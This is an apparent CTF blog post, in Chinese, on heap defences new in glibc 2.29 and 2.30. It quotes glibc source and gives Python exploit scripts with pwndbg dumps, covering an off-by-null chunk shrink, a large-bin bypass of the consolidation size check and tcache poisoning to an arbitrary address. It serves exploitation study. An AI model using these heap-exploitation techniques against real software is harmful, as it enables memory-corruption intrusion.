---
title: GLIBC-2.29 GLIBC-2.30新增防御机制和绕过方法汇总
date: 2020-03-12 01:31:22
tags:
- pwn
- glibc
categories: CTF
description: 现在新题很多用到GLIBC-2.29和GLIBC-2.30 在这里尝试做个总结
---

## GLIBC-2.29



### tcache

​	`tcache` 不能 double free 了。

```c
/* This test succeeds on double free.  However, we don't 100%
    trust it (it also matches random payload data at a 1 in
    2^<size_t> chance), so verify it's not an unlikely
    coincidence before aborting.  */
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
    tmp;
    tmp = tmp->next)
      if (tmp == e)
  malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
        few cycles, but don't abort.  */
  }
```

​	在 GLIBC-2.27 中, 直接连续free同一个chunk两次, `tcache`链上就有两个相同的chunk了。再通过malloc并改掉fd就可以十分简单的构造`tcache double free attack` 。也就是`free -> free -> malloc -> edit_fd -> malloc -> malloc_target`。 而且这里的`malloc_target`没有`size`的限制, 不像`fastbin attack`打`malloc_hook`只能用0x70大小的chunk。在GLIBC-2.27+中, `tcache`在`malloc`时不会有`size_check`。

​	在GLIBC-2.29中, 每次`free`把 chunk 扔进`tcache`的时候, 都会遍历该条`tcache`链, 如果有重复的chunk, 则报错`free(): double free detected in tcache 2`

​	目前的绕过方法有:

- 填满`tcache`链, 回归最原始的`double free`
- 待补充



```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;

/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

之前没有注意到的, `tcache_entry`这个结构体不止有`next`, 还有`key`。`key`占据`bk`的位置, 指向`tcache_perthread_struct`的首地址。

可以看看以下代码运行时内存情况

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *ptr1 = NULL, *ptr2 = NULL;
    ptr1 = malloc(0x28);
    ptr2 = malloc(0x28);
    free(ptr1);
    free(ptr2);
    ptr1 = malloc(0x28);
    ptr2 = malloc(0x28);
    return 0;
}
```

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913047/blog/Snipaste_2020-03-11_15-50-14_bpo6sp.png)

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913393/blog/Snipaste_2020-03-11_15-56-18_wcxiio.png)

然后`free`掉chunk1

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913616/blog/Snipaste_2020-03-11_16-00-00_lwxnzc.png)

注意``tcache_perthread_struct`中的`counts`数组是`char`型的

再`free`掉chunk2

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913861/blog/Snipaste_2020-03-11_16-04-06_wwawpy.png)

再`malloc` chunk2

![](https://res.cloudinary.com/v1mecn/image/upload/v1583914084/blog/Snipaste_2020-03-11_16-07-49_ctma6f.png)

最后`malloc` chunk1

![](https://res.cloudinary.com/v1mecn/image/upload/v1583914231/blog/Snipaste_2020-03-11_16-09-57_rsn6fs.png)

所以 要是能有办法把已经在`tcache`链表中的chunk的`key`改掉，还是可以打`tcache double free`。



### Chunk Extend/Shrink

#### Shrink in 2.23

先复习一下传统的`Chunk Shrink`

这里借用[大佬博客]([https://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/](https://veritas501.space/2017/07/25/图形化展示堆利用过程/))的一张图

![](https://res.cloudinary.com/v1mecn/image/upload/v1583925963/blog/jarvis_wp_95bcea49439afbbed824177750e51673_ykx9bd.png)



步骤是

```python
add(0, 0x18)
add(1, 0x108)
add(2, 0x138)  # small_chunk

edit(1, 0x108, b'\x00' * 0xf0 + p64(0x100) + p64(0x21))  # 0x100 is fake prev_size
free(1)

edit(0, 0x19, b'\x00' * 0x19)  # off-by-null
add(3, 0x88)
add(4, 0x68)  # overlap_chunk
free(3)
free(2)

# fast bin attack
free(4)
add(5, 0x108)
edit(5, 0x108, b'\x00' * 0x88 + p64(0x70) + p64(0x12345678))
"""
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x20fa0b0 ◂— 0x12345678
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
"""
```

#### check in 2.29

但是很可惜, 在`GLIBC-2.29`中增加了一个check

```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
  unlink_chunk (av, p);
}
```

这导致在第12行`free(2)`的时候, `prev_size`是`0x110`但是前一个chunk的`size`却是`0x100`

除非再溢出chunk0修改chunk1的`size`为`0x110`

但是一般题目只会给`off-by-null`

#### bypass

这里的bypass来自[Ex大佬](http://blog.eonew.cn/archives/1233) 需要利用到`large_bin` 构造十分巧妙

我把bypass脚本贴在这 自认为是可以说明问题的

```python
add(0, 0x708)
add(1, 0x18)  # avoid top chunk consodidating
free(0)
add(2, 0x718)  # malloc a large chunk to put the chunk 0 to large bins
add(3, 0x68)  # get the large-bin-chunk. named as chunk_A
edit(3, 0x68, p64(0) + p64(0x81) + b'\x80\x39')  # partial overwrite
add(4, 0x18)
add(5, 0x4f8)

# re-get the 0x18 chunk(chunk4) to trigger off-by-null
# of course, if you can `edit`, just edit it directly.
for i in range(7):
    add(6 + i, 0x18)
for i in range(7):
    free(6 + i)
free(4)
for i in range(7):
    add(6 + i, 0x18)
add(4, 0x18)
edit(4, 0x19, p64(0) * 2 + p64(0x80) + b'\x00')  # off-by-null
"""
pwndbg> x/200xg 0x603250
0x603250:	0x0000000000000000	0x0000000000000071  <-- chunk_A chunk3
0x603260:	0x0000000000000000	0x0000000000000081  <-- fake_chunk_B
0x603270:	0x0000000000603980	0x0000000000603250
0x603280:	0x0000000000000000	0x0000000000000000
0x603290:	0x0000000000000000	0x0000000000000000
0x6032a0:	0x0000000000000000	0x0000000000000000
0x6032b0:	0x0000000000000000	0x0000000000000000
0x6032c0:	0x0000000000000000	0x0000000000000021  <-- chunk4
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000080	0x0000000000000500  <-- chunk5
0x6032f0:	0x00007ffff7fb1130	0x00007ffff7fb1130
0x603300:	0x00000000006032e0	0x00000000006032e0
0x603310:	0x0000000000000000	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000000
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000


pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6038c0 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x6038c0
smallbins
empty
largebins
empty
"""

# place two chunks to unsortedbin
# so that 0x603980 chunk's bk is a heap address
add(6, 0x188)
add(7, 0x418)
add(8, 0x188)
free(2)
free(7)
"""
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x604230 —▸ 0x603980 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x604230 /* '0B`' */
smallbins
0x180: 0x6037e0 —▸ 0x7ffff7fb0e10 (main_arena+464) ◂— 0x6037e0
largebins
empty
pwndbg> x/20xg 0x603980
0x603980:	0x0000000000000000	0x0000000000000721
0x603990:	0x00007ffff7fb0ca0	0x0000000000604230
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000000	0x0000000000000000
"""

# get chunk 0x603980 and partial overwrite its bk to fake_chunk_B
# so that in fake_chunk_B, `fd->bk == fake_chunk_B == 0x603260`
add(9, 0x718)  # chunk whose bk is heap addr
edit(9, 0x10, p64(0) + b'\x60\x32')
"""
pwndbg> x/20xg 0x603980
0x603980:	0x0000000000000000	0x0000000000000721
0x603990:	0x0000000000000000	0x0000000000603260
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000000	0x0000000000000000
"""

# use fastbin to make `*(0x603260) = 0x603260`
# so that in fake_chunk_B, `bk->fd = fake_chunk_B == 0x603260`
for i in range(8):
    add(10 + i, 0x68)
for i in range(8):
    free(10 + i)
free(3)
for i in range(7):
    add(10 + i, 0x68)
add(3, 0x68)
edit(3, 0x68, '\x60\x32')
"""
pwndbg> x/40xg 0x603250
0x603250:	0x0000000000000000	0x0000000000000071
0x603260:	0x0000000000603260	0x0000000000000081
0x603270:	0x0000000000603980	0x0000000000603250
0x603280:	0x0000000000000000	0x0000000000000000
0x603290:	0x0000000000000000	0x0000000000000000
0x6032a0:	0x0000000000000000	0x0000000000000000
0x6032b0:	0x0000000000000000	0x0000000000000000
0x6032c0:	0x0000000000000000	0x0000000000000021
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000080	0x0000000000000500
0x6032f0:	0x00007ffff7fb1130	0x00007ffff7fb1130
0x603300:	0x00000000006032e0	0x00000000006032e0
0x603310:	0x0000000000000000	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000000
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000

fd->bk == bk->fd == p
"""

# trigger free chunk5
# you can see 0x603260 is in unsortedbin
free(5)
"""
pwndbg> bins
tcachebins
0x70 [  1]: 0x6044e0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603260 —▸ 0x604540 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x603260 /* '`2`' */
smallbins
0x30: 0x603930 —▸ 0x7ffff7fb0cc0 (main_arena+128) ◂— 0x603930 /* '09`' */
largebins
empty
"""

# tcache attack
add(10, 0x108)
add(11, 0x58)
for i in range(7):
    add(12 + i, 0x68)
for i in range(7):
    free(12 + i)
free(3)
free(11)
for i in range(7):
    add(12 + i, 0x68)
add(3, 0x68)

target_addr = 0x602090

edit(3, 0x20, p64(0) + p64(0x61) + p64(target_addr))
add(12, 0x58)
add(13, 0x58)
```

先总结到这吧 明天继续... 

TODO: 

- glibc-2.29 largebin attack
- all in glibc-2.30